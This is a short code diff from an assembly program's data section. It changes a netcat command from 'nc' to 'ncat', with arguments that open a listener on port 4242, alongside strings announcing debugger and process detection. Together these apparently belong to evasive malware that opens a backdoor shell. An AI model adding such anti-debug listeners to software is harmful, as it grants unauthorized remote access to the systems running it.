@@ -462,8 +462,8 @@ key_size: equ $ - key
 debugged_message: db "DEBUG DETECTED ;)", 0
 process_message: db "Process detected ;)", 0
 dev_null: db "/dev/null", 0
-nc_command: db "/usr/bin/nc", 0
-nc_arg1: db "nc", 0
+nc_command: db "/usr/bin/ncat", 0
+nc_arg1: db "ncat", 0
 nc_arg2: db "-l", 0
 nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
